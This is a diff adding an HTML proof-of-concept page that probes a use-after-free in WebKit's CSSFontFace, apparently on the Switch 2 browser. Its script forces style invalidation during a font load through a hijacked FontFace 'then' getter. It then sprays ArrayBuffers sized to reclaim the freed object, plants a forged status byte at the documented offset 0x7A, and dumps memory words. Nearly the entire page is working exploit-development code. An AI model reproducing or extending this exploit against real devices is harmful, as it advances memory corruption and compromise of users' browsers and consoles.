@@ -1,0 +1,89 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CSSFontFace setStatus probe</title>
+<style>
+  body { margin:0; padding:20px; background:#0b0e14; color:#d7dce5;
+         font-family: system-ui, sans-serif; }
+  #o { white-space:pre-wrap; font:13px/1.5 ui-monospace, monospace; color:#9fb4d6; }
+  #v { font-size:56px; font-weight:700; }
+</style>
+</head>
+<body>
+  <style id="invalidate">x {}</style>
+  <div id="v">setStatus</div>
+  <pre id="o">running…</pre>
+  <script>
+  "use strict";
+  var out = document.getElementById("o");
+  function log(s) { out.textContent += s + "\n"; }
+  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+  function hex8(v) { return ("00000000" + (v >>> 0).toString(16)).slice(-8); }
+
+  // Known Switch 2 CSSFontFace layout (WebKit-CSSFontFace-UAF.md):
+  //   status +0x7A, source count +0x4C, source vector +0x40,
+  //   clients +0x58, client slot +0x18
+  var LAYOUT = { status: 0x7a, srcCount: 0x4c, srcVec: 0x40, clients: 0x58, slot: 0x18 };
+
+  function dumpWords(label, ab) {
+    var u = new Uint8Array(ab), lines = [];
+    for (var i = 0; i + 8 <= u.length; i += 8) {
+      var lo = (u[i] | u[i+1]<<8 | u[i+2]<<16 | u[i+3]<<24) >>> 0;
+      var hi = (u[i+4] | u[i+5]<<8 | u[i+6]<<16 | u[i+7]<<24) >>> 0;
+      var tag = (hi === 0 && lo === 0) ? "  0" : (hi === 0 ? "  ptr?" : "  0x" + hex8(hi));
+      lines.push("+" + ("000" + i.toString(16)).slice(-3) + "  " + hex8(hi) + " " + hex8(lo) + tag);
+    }
+    log(label + ":\n" + lines.join("\n"));
+    log("  status@0x7a = " + u[0x7a] + "  srcCount@0x4c = " + (u[0x4c] | u[0x4d]<<8 | u[0x4e]<<16 | u[0x4f]<<24));
+  }
+
+  async function run() {
+    log("UA: " + navigator.userAgent);
+    if (typeof FontFace === "undefined" || !document.fonts) { log("no FontFace"); return; }
+
+    var sheet = document.createElement("style");
+    sheet.textContent = "@font-face { font-family: TriggerFont; src: local(Helvetica); }";
+    document.head.append(sheet);
+    void document.body.offsetHeight;
+
+    var face = null;
+    for (var f of document.fonts) {
+      if (f.family.replaceAll(/['"]/g, "") === "TriggerFont") { face = f; break; }
+    }
+    log("TriggerFont: " + (face ? "found" : "MISSING"));
+    if (!face) return;
+
+    void face.loaded;
+
+    Object.defineProperty(FontFace.prototype, "then", {
+      configurable: true,
+      get: function () {
+        var inv = document.querySelector("#invalidate");
+        if (inv) inv.remove();
+        void document.body.offsetHeight;
+      }
+    });
+
+    face.load();
+    await sleep(400);
+
+    // reclaim candidates: object is >= 0x7C (status at 0x7A) + flags
+    var sizes = [0x78, 0x80, 0x88, 0x90, 0x98, 0xa0, 0xb0];
+    for (var i = 0; i < sizes.length; i++) {
+      var s = sizes[i];
+      var ab = new ArrayBuffer(s);
+      var dv = new DataView(ab);
+      try { dv.setUint32(8, 1, true); dv.setUint32(12, 0, true); dv.setUint8(LAYOUT.status, 3); } catch (e) {}
+      log("reclaim size=0x" + s.toString(16));
+      try { dumpWords("object", ab); } catch (e) {}
+      await sleep(150);
+    }
+    log("done");
+  }
+
+  run();
+  </script>
+</body>
+</html>
